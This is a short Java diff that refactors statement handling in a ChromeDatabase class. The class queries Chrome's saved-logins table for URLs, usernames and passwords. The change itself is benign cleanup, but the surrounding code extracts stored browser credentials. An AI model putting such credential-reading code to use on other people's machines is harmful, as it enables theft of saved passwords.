@@ -9,6 +9,7 @@ import java.nio.file.Paths;
 import java.sql.Connection;
 import java.sql.ResultSet;
 import java.sql.SQLException;
+import java.sql.Statement;
 
 import org.sqlite.SQLiteConfig;
 import org.sqlite.SQLiteConfig.TransactionMode;
@@ -80,9 +81,8 @@ public final class ChromeDatabase {
 
 		try {
 			// Temporary ResultSet to get data from database
-			ResultSet results = connection
-					.createStatement()
-					.executeQuery("SELECT action_url, username_value, password_value FROM logins");
+			Statement statement = connection.createStatement();
+			ResultSet results = statement.executeQuery("SELECT action_url, username_value, password_value FROM logins");
 
 			while (results.next()) {
 				String url, username, password;
@@ -97,7 +97,7 @@ public final class ChromeDatabase {
 			}
 
 			results.close();
-			results.getStatement().close();
+			statement.close();
 		} catch (SQLException ex) {
 			throw new DatabaseException("Error reading database, is it corrupted? " + ex);
 		}
